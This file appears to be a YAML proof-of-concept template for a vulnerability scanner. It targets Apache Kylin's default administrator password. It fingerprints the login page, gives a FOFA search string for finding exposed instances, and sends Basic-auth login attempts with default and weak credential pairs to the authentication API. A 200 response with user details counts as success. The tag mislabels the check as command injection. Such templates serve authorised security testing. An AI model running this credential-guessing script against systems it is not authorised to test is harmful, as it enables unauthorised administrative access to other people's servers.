id: poc-yaml-apache-kylin-weak-password
info:
  name: Apache Kylin 后台默认密码
  severity: high
  tags:
  - 命令注入
  finger: Apache-Kylin
  fofa: app="APACHE-kylin"
variables:
  t1: 'base64("admin:KYLIN")

    base64("ADMIN:KYLIN")

    base64("admin:kylin")

    base64("ADMIN:kylin")

    base64("admin:123456")

    base64("ADMIN:123456")'
firstRequest:
  method: GET
  path: /kylin/login
  expression: 'contains(body,"<title>Kylin</title>") &&

    contains(body,"apache")

    '
requests:
- method: POST
  path: /kylin/api/user/authentication
  headers:
    Authorization: Basic {{.t1}}
  expression: 'status_code == 200 &&

    contains(body,"userDetails") &&

    contains(body,"username") &&

    contains(body,"password") &&

    contains(headers,"application/json")

    '
transport: http
